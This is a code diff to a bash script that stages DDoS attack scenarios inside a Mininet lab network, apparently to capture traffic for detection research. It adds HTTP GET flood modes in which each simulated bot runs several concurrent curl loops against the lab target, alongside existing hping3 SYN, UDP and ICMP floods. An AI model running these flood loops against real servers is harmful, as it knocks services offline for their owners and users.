@@ -27,6 +27,9 @@
 #     udp-medium   UDP flood :53 (512 B), ~300 pps/bot
 #     udp-high     UDP flood :53 (512 B), ~800 pps/bot
 #     icmp         ICMP echo flood, ~200 pps/bot
+#     http-low     HTTP GET flood :80, 1 curl loop  per bot  (L7)
+#     http-medium  HTTP GET flood :80, 3 curl loops per bot  (L7)
+#     http-high    HTTP GET flood :80, 6 curl loops per bot  (L7)
 #     mixed        SYN + UDP + ICMP simultaneously, split across 3 bot groups
 #
 # Must run on the VM HOST SHELL (NOT inside the Mininet CLI) with root
@@ -158,6 +161,60 @@ launch_attack() {
 }
 
 # --------------------------------------------------------------------------
+# HTTP (L7) flood launcher
+# --------------------------------------------------------------------------
+# launch_http_flood LABEL DURATION WORKERS_PER_BOT
+#
+# Spawns WORKERS_PER_BOT concurrent curl loops inside each bot's namespace.
+# Unlike the hping3 scenarios (which craft L3/L4 packets directly), this
+# one produces FULL TCP+HTTP conversations -- real 3-way handshakes, real
+# GET requests, real responses or connection resets -- so the resulting
+# pcap contains L7 features (HTTP verbs, headers, per-request timing) that
+# a SYN flood cannot. This is what makes it a "web DDoS" vector.
+#
+# For meaningful L7 behaviour the target must be running an HTTP listener
+# on :80. The easiest way is to run `traffic/normal_traffic.sh start`
+# beforehand, which brings up python3 -m http.server 80 on target.
+# Without a listener the flood degenerates into a SYN/RST storm (still
+# captured, just less L7-interesting).
+#
+# Each worker is wrapped in `timeout -k 2 <duration>` so it self-terminates
+# at the end of the scenario even if the orchestrator is killed.
+launch_http_flood() {
+    local label="$1" duration="$2" workers="$3"
+
+    if ! [[ "$workers" =~ ^[0-9]+$ ]] || (( workers < 1 )); then
+        echo "ERROR: launch_http_flood: workers must be a positive integer (got '$workers')" >&2
+        exit 2
+    fi
+
+    mkdir -p "$LOGDIR"
+
+    local launched=0 missing=0 h pid w
+    for h in "${BOTS[@]}"; do
+        pid="$(ns_pid "$h")"
+        if [[ -z "$pid" ]]; then
+            missing=$((missing+1))
+            log "  WARN: $h namespace not found, skipping"
+            continue
+        fi
+        # N concurrent curl loops per bot. `curl --max-time 2` caps each
+        # request so queued connections on an overloaded target never
+        # stall the loop.  Break out of single quotes so $TARGET is
+        # expanded into the bash -c argv, matching the pkill patterns in
+        # stop_attacks().
+        for (( w=1; w<=workers; w++ )); do
+            mnexec -a "$pid" timeout -k 2 "$duration" bash -c \
+                'while true; do curl -s --max-time 2 -o /dev/null "http://'"$TARGET"'/" || true; done' \
+                >>"$LOGDIR/$h.$label.log" 2>&1 &
+            echo $! >> "$PIDFILE"
+        done
+        launched=$((launched+1))
+    done
+    log "  $label : $launched/${#BOTS[@]} bots x $workers workers (missing=$missing) -> http://$TARGET/"
+}
+
+# --------------------------------------------------------------------------
 # Scenarios
 # --------------------------------------------------------------------------
 run_scenario() {
@@ -205,6 +262,18 @@ run_scenario() {
         icmp)
             local BOTS=("${BOTS_ALL[@]}")
             launch_attack icmp "$duration" -- --icmp -i u5000
+            ;;
+        http-low)
+            local BOTS=("${BOTS_ALL[@]}")
+            launch_http_flood http-low "$duration" 1
+            ;;
+        http-medium)
+            local BOTS=("${BOTS_ALL[@]}")
+            launch_http_flood http-medium "$duration" 3
+            ;;
+        http-high)
+            local BOTS=("${BOTS_ALL[@]}")
+            launch_http_flood http-high "$duration" 6
             ;;
         mixed)
             # Split bots into three equal-ish groups and hit the target
@@ -260,12 +329,15 @@ stop_attacks() {
         rm -f "$PIDFILE"
     fi
 
-    # 2. Belt-and-suspenders: kill any lingering hping3 inside each bot ns.
+    # 2. Belt-and-suspenders: kill any lingering attack tools inside each
+    #    bot namespace (hping3 from the L3/L4 scenarios, curl from the
+    #    http-* L7 scenarios).
     for h in "${BOTS_ALL[@]}"; do
         local pid
         pid="$(ns_pid "$h")"
         [[ -z "$pid" ]] && continue
-        mnexec -a "$pid" pkill -9 -f hping3 2>/dev/null || true
+        mnexec -a "$pid" pkill -9 -f hping3          2>/dev/null || true
+        mnexec -a "$pid" pkill -9 -f "curl.*$TARGET" 2>/dev/null || true
     done
 
     [[ "$quiet" != "quiet" ]] && log "all attacks stopped"
@@ -294,10 +366,13 @@ cmd_status() {
         echo "supervisors:  no active run tracked"
     fi
 
-    # Count hping3 processes globally (cheap approximation).
-    local hping_count
+    # Count attack-tool processes globally (cheap approximation; includes
+    # every namespace because /proc is shared).
+    local hping_count curl_count
     hping_count="$(pgrep -c -x hping3 2>/dev/null || echo 0)"
-    echo "hping3 procs: $hping_count"
+    curl_count="$(pgrep -c -f "curl.*$TARGET" 2>/dev/null || echo 0)"
+    echo "hping3 procs: $hping_count   (non-zero = L3/L4 flood active)"
+    echo "curl procs:   $curl_count   (http-* flood + normal_traffic combined)"
     echo "logs:         $LOGFILE  and  $LOGDIR/"
 }
 
@@ -313,8 +388,15 @@ Scenarios (all target $TARGET from every bot unless noted):
     udp-medium   UDP  flood :53, ~300 pps/bot
     udp-high     UDP  flood :53, ~800 pps/bot
     icmp         ICMP echo  flood, ~200 pps/bot
+    http-low     HTTP GET flood :80, 1 curl loop  per bot   (L7, 45 conns)
+    http-medium  HTTP GET flood :80, 3 curl loops per bot   (L7, 135 conns)
+    http-high    HTTP GET flood :80, 6 curl loops per bot   (L7, 270 conns)
     mixed        SYN + UDP + ICMP across three equal bot groups, each
                  at ~200 pps/bot
+
+Note: http-* scenarios need an HTTP listener on $TARGET:80. Start
+      traffic/normal_traffic.sh first so target runs a Python http.server;
+      without it http-* degenerates into a SYN/RST storm (still captured).
 
 EOF
 }
